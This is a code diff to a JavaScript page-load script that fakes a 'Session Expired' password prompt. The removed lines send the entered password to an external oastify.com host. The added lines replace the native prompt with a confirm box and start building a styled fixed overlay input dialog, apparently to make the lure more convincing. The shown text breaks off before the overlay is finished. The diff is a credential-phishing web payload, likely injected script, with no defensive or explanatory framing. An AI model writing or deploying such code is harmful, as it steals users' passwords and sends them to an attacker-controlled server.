@@ -1,20 +1,16 @@
 window.addEventListener('load', function() {
-    // Show a prompt to the user to enter their password
-    let password = prompt("Session Expired. Please re-enter your password:");
+    // Show a confirmation dialog to let the user know the session is expired
+    let userConfirmed = confirm("Session Expired. Do you want to re-enter your password?");
 
-    // If the user entered a password, send it to the external server using fetch
-    if (password) {
-        fetch(`https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`, {
-            method: 'GET',
-            headers: {
-                'Content-Type': 'application/json'
-            }
-        }).then(response => {
-            // Handle response if needed
-            console.log('Password sent successfully');
-        }).catch(error => {
-            // Handle errors
-            console.error('Error sending password:', error);
-        });
-    }
-});
+    if (userConfirmed) {
+        // Create a custom input dialog dynamically
+        let div = document.createElement('div');
+        div.style.position = 'fixed';
+        div.style.top = '30%';
+        div.style.left = '50%';
+        div.style.transform = 'translate(-50%, -50%)';
+        div.style.background = 'white';
+        div.style.padding = '20px';
+        div.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
+        div.style.zIndex = '9999';
+ 
